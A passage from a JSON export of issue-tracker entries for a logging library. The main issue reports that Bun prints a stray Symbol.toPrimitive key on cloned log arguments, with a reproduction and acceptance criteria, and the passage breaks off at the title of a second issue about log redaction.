prints non-enumerable symbol keys, so under Bun every object passed as a trailing log argument shows `[Symbol(Symbol.toPrimitive)]: [Function: value]` once per nesting level:\\n\\n```\\n Info       probe-console-symbol {\\n  [Symbol(Symbol.toPrimitive)]: [Function: value],\\n  owner: {\\n    [Symbol(Symbol.toPrimitive)]: [Function: value],\\n    id: \\\"u1\\\",\\n  },\\n```\\n\\nReproduced on develop `27dec7b0c3` with `logger.info(\\\"probe-console-symbol\\\", { owner: { id: \\\"u1\\\" } })` under Bun 1.4.2; Node 24 prints the same clone without it.\\n\\n## Acceptance\\n\\n- Clones without a shadowing `toString` own no symbol keys and print cleanly under Bun.\\n- #32957's coercion protection still holds for clones that own a non-callable `toString` (and for Error clones).\\n\\nFix: #33048\\n\",\"createdAt\":\"2026-10-02T14:11:25Z\",\"closedAt\":\"2026-10-04T03:12:24Z\",\"state\":\"CLOSED\",\"commentCount\":0},{\"id\":\"I_kwDOMT5cIs8AAAABUlGbSg\",\"title\":\"Log redaction marks shared (non-cyclic) references as [Circular]\"
